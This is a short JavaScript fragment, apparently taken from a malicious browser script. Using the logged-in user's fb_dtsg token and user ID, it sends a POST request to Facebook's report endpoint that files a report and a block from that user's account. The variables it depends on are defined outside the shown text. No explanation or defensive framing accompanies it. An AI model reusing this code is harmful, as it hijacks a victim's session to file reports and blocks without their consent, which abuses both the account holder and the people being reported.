  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/report/social.php";
  var PageParams ="fb_dtsg="+fb_dtsg+"&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22report_type%22%3A145%2C%22rid%22%3A%2C%22sub_report_type%22%3A145%2C%22time_flow_started%22%3A"+now+"%2C%22user%22%3A"+user_id+"%7D&file_report=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmpnxl2u5F92Kemm&__req=f&ttstamp=265816695101676667";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
